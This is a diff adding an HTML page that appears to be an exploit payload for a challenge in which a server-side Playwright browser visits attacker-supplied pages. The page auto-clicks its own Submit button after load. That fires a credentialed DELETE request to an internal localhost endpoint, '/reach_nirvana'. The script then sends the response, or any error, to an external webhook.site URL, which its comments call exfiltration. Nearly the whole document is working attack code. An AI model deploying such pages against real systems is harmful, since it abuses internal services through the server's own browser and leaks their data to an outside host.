@@ -1,0 +1,46 @@
+<!doctype html>
+<html>
+  <head><meta charset="utf-8"><title>Submit</title></head>
+  <body>
+    <button id="btn">Submit</button>
+    <pre id="out"></pre>
+
+    <script>
+      async function run() {
+        const out = document.getElementById('out');
+        try {
+          out.textContent = "Sending DELETE to internal endpoint...";
+          // Delete /reach_nirvana from the server's localhost (Playwright runs on server)
+          const resp = await fetch("http://127.0.0.1:3000/reach_nirvana", {
+            method: 'DELETE',
+            credentials: 'include'
+          });
+          const text = await resp.text();
+          out.textContent = 'STATUS: ' + resp.status + '\n\n' + text;
+
+          // Exfiltrate the response to your webhook
+          await fetch("https://webhook.site/d70bc54c-8d05-4870-a18a-8ed01c2a0fa6", {
+            method: 'POST',
+            headers: { 'Content-Type': 'text/plain' },
+            body: text
+          });
+        } catch (e) {
+          out.textContent = 'ERROR: ' + e;
+          try {
+            await fetch("https://webhook.site/d70bc54c-8d05-4870-a18a-8ed01c2a0fa6", {
+              method: 'POST',
+              headers: { 'Content-Type': 'text/plain' },
+              body: 'ERROR: ' + String(e)
+            });
+          } catch (ee) {
+            // ignore
+          }
+        }
+      }
+
+      document.getElementById('btn').addEventListener('click', run);
+      // auto-click shortly after load (Playwright will also click the button by role "Submit")
+      setTimeout(() => document.getElementById('btn').click(), 500);
+    </script>
+  </body>
+</html>
